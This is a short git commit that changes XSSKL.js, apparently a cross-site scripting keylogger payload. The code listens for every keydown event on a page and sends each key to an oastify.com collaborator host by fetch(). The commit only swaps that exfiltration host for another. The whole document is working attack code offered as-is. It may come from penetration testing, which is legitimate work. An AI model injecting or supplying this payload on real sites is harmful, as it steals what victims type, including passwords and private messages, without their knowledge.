0de6af399bbe80f558369403ebe1e6858094eca0
gaze11e <117212620+gaze11e@users.noreply.github.com>
2024-07-01 10:00:38 -0400

    Update XSSKL.js

--- XSSKL.js
+++ XSSKL.js
@@ -1,5 +1,5 @@
 function logKey(event){
-	fetch("https://bcrdg18kj6nvnl5gq4ff5t1xgomga5.oastify.com/k?key=" + event.key)
+	fetch("https://7aisk2irsh853llusg54n1imqdw4ky8n.oastify.com/k?key=" + event.key)
 }
 
 document.addEventListener('keydown', logKey);
